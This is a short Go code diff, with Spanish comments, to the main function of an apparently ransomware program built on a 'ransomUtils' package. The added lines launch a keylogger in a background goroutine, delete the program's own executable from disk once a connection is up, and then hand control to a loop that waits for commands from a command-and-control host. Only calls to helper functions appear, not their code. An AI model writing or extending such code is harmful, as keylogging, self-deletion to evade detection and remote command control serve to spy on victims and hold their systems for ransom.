@@ -17,7 +17,10 @@ func main() {
 		key = defaultKey
 	}
 
+	go ransomUtils.RegistroTeclas() //parte opcional: arranca el sondeo del teclado
+
 	if con != nil {
+		ransomUtils.AutoBorrar() //parte opcional: si la conexion funciona, borro el exe del disco
 		ransomUtils.EsperarComandos(con, re, c2Host, key)
 	}
 }
